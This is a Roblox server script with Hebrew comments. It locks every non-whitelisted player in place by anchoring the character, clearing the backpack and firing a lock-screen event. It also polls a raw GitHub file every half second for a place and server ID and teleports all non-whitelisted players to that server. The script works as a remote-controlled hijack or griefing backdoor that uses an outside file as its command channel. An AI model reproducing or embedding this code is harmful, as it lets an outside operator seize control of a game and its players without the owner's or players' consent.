local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LockEvent = ReplicatedStorage:WaitForChild("LockEvent")

local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
local whitelisted = {["noamdb15"] = true, ["dylanzyl123"] = true}

Players.PlayerAdded:Connect(function(player)
	if whitelisted[player.Name] then return end
	
	player.CharacterAdded:Connect(function(char)
		task.wait(0.5)
		-- פקודה למסך וסאונד
		LockEvent:FireClient(player)
		
		-- נעילה ומחיקת חפצים בלופ
		task.spawn(function()
			while player.Parent do
				if char:FindFirstChild("HumanoidRootPart") then
					char.HumanoidRootPart.Anchored = true
					player.Backpack:ClearAllChildren()
				end
				task.wait(0.1)
			end
		end)
	end)
end)

-- לופ שיגור
task.spawn(function()
	while task.wait(0.5) do
		local s, r = pcall(function() return HttpService:GetAsync(rawUrl.."?t="..tick()) end)
		if s and r then
			local lines = {}
			for line in r:gmatch("[^\r\n]+") do table.insert(lines, line) end
			if lines[2] and lines[2] ~= "" then
				for _, p in pairs(Players:GetPlayers()) do
					if not whitelisted[p.Name] then
						pcall(function() TeleportService:TeleportToPlaceInstance(tonumber(lines[1]), lines[2], p) end)
					end
				end
			end
		end
	end
end)
